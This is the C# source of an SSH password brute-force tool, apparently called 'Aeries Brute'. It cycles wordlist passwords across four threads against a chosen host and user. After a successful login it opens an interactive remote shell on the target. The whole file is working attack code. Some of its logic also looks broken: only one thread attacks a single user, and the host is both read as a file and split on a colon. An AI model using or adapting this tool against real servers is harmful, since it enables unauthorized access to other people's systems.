using System;
using System.IO;
using Renci.SshNet;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

namespace Aeries
{
    class Program
    {
        public static bool bol1 = false;
        public static string[] passwords = new string[6]; 
        public static string wordlist;
        public static string ip, pass, user, word, port;
        public static int Port;
        public static bool bol2 = false;
        public static bool found = false;

        public static List<string> list1 = new List<string>();
        public static List<string> list2 = new List<string>();
        public static List<string> list3 = new List<string>();
        public static List<string> list4 = new List<string>();

        public static void banner()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"   _____               .__               	");
            Console.WriteLine(@"  /  _  \   ___________|__| ____   ______	");
            Console.WriteLine(@" /  /_\  \_/ __ \_  __ \  |/ __ \ /  ___/	");
            Console.WriteLine(@"/    |    \  ___/|  | \/  \  ___/ \___ \ 	");
            Console.WriteLine(@"\____|__  /\___  >__|  |__|\___  >____  >	");
            Console.Write(@"        \/     \/     ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("Brute");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine(@"    \/     \/ 	");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"--------------------------------------------------------------------------");
        }
        private static List<string> users = new List<string>();
        public static void Main(string[] args)
        {
            if (args.Length == 0)
                begin(); 
            else
            {
                ip = args[0];
                port = args[1];
                if (File.Exists(args[2]))
                {
                    string[] _users = File.ReadAllLines("userList.txt");
                    foreach (string _user in _users)
                        users.Add(_user);
                    usingUserList = true;
                }
                else
                    user = args[2];
                word = args[3];
            }
            Console.WriteLine("Loading wordlist..."); 
            wordlist = word;
            threads();

            try
            {
                Console.WriteLine("Attack started with 4 threads.");
                Thread t = new Thread(() => DefineAttack(list1, 1));
                Thread t2 = new Thread(() => DefineAttack(list2, 2));
                Thread t3 = new Thread(() => DefineAttack(list3, 3));
                Thread t4 = new Thread(() => DefineAttack(list4, 4));
                t.Start();
                Thread.Sleep(500);
                t2.Start();
                Thread.Sleep(500);
                t3.Start();
                Thread.Sleep(500);
                t4.Start();

            }
            catch
            {
                Console.WriteLine("The file does not exist.");
                Environment.Exit(0);
            }
            

        }
        public static void threads()
        {
            StreamReader str;
            try
            {
                if (usingUserList)
                    str = new StreamReader(user);
                else
                    str = new StreamReader(wordlist);
                string word = "";
                int cont = 0;
                while ((word = str.ReadLine()) != null)
                {
                    cont++;
                    if (cont == 1) 
                        list1.Add(word);
                    else if (cont == 2)
                        list2.Add(word);
                    else if (cont == 3)
                        list3.Add(word);
                    else if (cont == 4)
                        list4.Add(word);
                    else
                    {
                        cont = 1;
                        list1.Add(word);
                    }
                }
            }
            catch(Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Wordlist was not found.");
                Console.ForegroundColor = ConsoleColor.White;
                Environment.Exit(0);
            }
        }
        public static void begin()
        {
            banner();
            Console.ForegroundColor = ConsoleColor.Green; 
        volt2:
            Console.WriteLine("Enter the host");
            Console.ForegroundColor = ConsoleColor.White;
            ip = Console.ReadLine();
            if (ip == "")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid IP");
                Console.ForegroundColor = ConsoleColor.White;
                goto volt2;
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("What is the port? (default 22)");
            Console.ForegroundColor = ConsoleColor.White;
            port = Console.ReadLine();

        volt1:
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("What is the user?");
            Console.ForegroundColor = ConsoleColor.White;
            user = Console.ReadLine();
            if (user == "")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid user. Type again!");
                Console.ForegroundColor = ConsoleColor.White;
                goto volt1;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("What wordlist? (hit enter for the default.) ");
            Console.ForegroundColor = ConsoleColor.White;
            word = Console.ReadLine();

            if (word == "")
                word = "wordlist.txt";
            if (port == "")
                Port = 22;
            else
                Port = Convert.ToInt32(port);
            string[] ipAddr = File.ReadAllLines(ip); 
            foreach (string _ip in ipAddr)
            {
                try
                {
                
                        TcpClient sh = new TcpClient();
                        sh.Connect(_ip, Port);
                }
                catch (Exception ex)
                {
                    if (ex.ToString().Contains("10061"))
                    {
                        Console.WriteLine("Port " + port + " of IP " + ip + " is closed.");
                        Environment.Exit(0);
                    }
                    else if (ex.ToString().Contains("11001"))
                    {
                        Console.WriteLine("The host " + ip + " does not exist. Canceling attack...");
                        Environment.Exit(0);
                    }
                    else if (ex.ToString().Contains("10060"))
                    {
                        Console.WriteLine("The port" + port + " is not in service. Do you want to try anyway? [y/n]");
                        string resp = Console.ReadLine();
                        if (resp == "n")
                            Environment.Exit(0);
                    }
                }

            }
        }
        private static void DefineAttack(List<string> list,int thread)
        {
            if (usingUserList)
            {
                StreamReader ustr = new StreamReader(user);
                foreach (var usr in users)
                {
                    try
                    {
                        AttackUserList(list, usr);
                    }
                    catch
                    { }
                }
            }
            else { if (thread == 4) { AttackSingleUser(list, user); } else { } }
        }
        public static int count = 0;
        private static bool usingUserList = false;
        public static void AttackUserList(List<string> lista, string userName)
        {
            string[] _ip = ip.Split(':');
            int ae = -1;
            foreach (var pass in lista) 
            {
                try
                {
                    if (found)
                        break;
                    else
                    {
                        using (var client = new SshClient(_ip[0], int.Parse(_ip[1]), userName, pass))
                        {
                            client.Connect();
                            client.Disconnect(); 
                            ae++;
                            passwords[ae] = pass;
                            if (!found) 
                            {
                                Console.WriteLine("[+] Password found - " + pass + "\nEnter 1 to open a shell\nEnter 2 to exit");
                                found = true;
                                string resp = Console.ReadLine();
                                if (resp == "1")
                                {
                                    Console.WriteLine("Opening shell...");
                                    client.Connect();

                                    while (true)
                                    {
                                        try
                                        {
                                            if (!bol2)
                                                Console.WriteLine("Shell opened. Type 'exit' to exit.");
                                            else
                                                Console.Write("$ ");
                                            bol2 = true;
                                            var comand = Console.ReadLine();
                                            var output = client.RunCommand(comand); 
                                            if (comand.ToString() == "exit")
                                                break;
                                            else
                                                Console.WriteLine(output.Result);
                                        }
                                        catch (Exception ex)
                                        {
                                            if (!ex.ToString().Contains("CommandText property is empty"))
                                                Console.WriteLine("Error!");
                                        }
                                    }
                                    client.Disconnect();
                                    end();
                                }
                                else 
                                    end();
                            }
                            else
                                break;


                        }
                    }
                }
                catch (Exception ex)
                {
                    if (!found) 
                    {
                        if (ex.ToString().Contains("Permission denied"))
                            Console.WriteLine("[+] Wrong password --> " + pass);
                        else if (ex.ToString().Contains("10051"))
                        {
                            Console.WriteLine("Could not connect to the target.");
                            bol1 = true;
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Unknown error: " + ex.ToString());
                            bol1 = true;
                            break;
                        }
                    }
                }

            }
            count++;
            if (count == 4)
            {
                end();
            }
        }
        public static void AttackSingleUser(List<string> lista, string userName)
        {
            string[] _ip = ip.Split(':');
            int ae = -1;
            foreach (var pass in lista) 
            {
                try
                {
                    if (found)
                        break;
                    else
                    {
                        using (var client = new SshClient(_ip[0], int.Parse(_ip[1]), userName, pass))
                        {
                            client.Connect();
                            client.Disconnect(); 
                            ae++;
                            passwords[ae] = pass; 
                            if (!found) 
                            {
                                Console.WriteLine("[+] Password found - " + pass + "\nEnter 1 to open a shell\nEnter 2 to exit");
                                found = true;
                                string resp = Console.ReadLine();
                                if (resp == "1")
                                {
                                    Console.WriteLine("Opening shell...");
                                    client.Connect();

                                    while (true)
                                    {
                                        try
                                        {
                                            if (!bol2)
                                                Console.WriteLine("Shell opened. Type 'exit' to exit.");
                                            else
                                                Console.Write("$ ");
                                            bol2 = true;
                                            var comand = Console.ReadLine();
                                            var output = client.RunCommand(comand); 
                                            if (comand.ToString() == "exit")
                                                break;
                                            else
                                                Console.WriteLine(output.Result);
                                        }
                                        catch (Exception ex)
                                        {
                                            if (!ex.ToString().Contains("CommandText property is empty"))
                                                Console.WriteLine("Error!");
                                        }
                                    }
                                    client.Disconnect();
                                    end();
                                }else
                                    end();
                            }
                            else
                                break;
                           

                        }
                    }
                }
                catch (Exception ex)
                {
                    if (!found) 
                    {
                        if (ex.ToString().Contains("Permission denied"))
                            Console.WriteLine("[+] Wrong password --> " + pass);
                        else if (ex.ToString().Contains("10051"))
                        {
                            Console.WriteLine("Could not connect to the target.");
                            bol1 = true;
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Unknown error: " + ex.ToString());
                            bol1 = true;
                            break;
                        }
                    }
                }

            }
            count++;
            if (count == 4)
            {
                end();
            }
        }
        public static int kpi = 0;
        public static void end()
        {
            kpi++;
            if (kpi != 1)
            {
                Console.WriteLine("\nEnd of the attack.");
                if (!bol1)
                {
                    Console.WriteLine("Password found for user " + user + ":");
                    bool found = false;
                    foreach (var item in passwords)
                    {
                        if (item != null)
                        {
                            Console.WriteLine("[+] " + item);
                            found = true;
                        }
                        if (!found)
                        {
                            Console.WriteLine("No password was found.");
                            break;
                        }
                    }
                }
            }
        }
    }

}
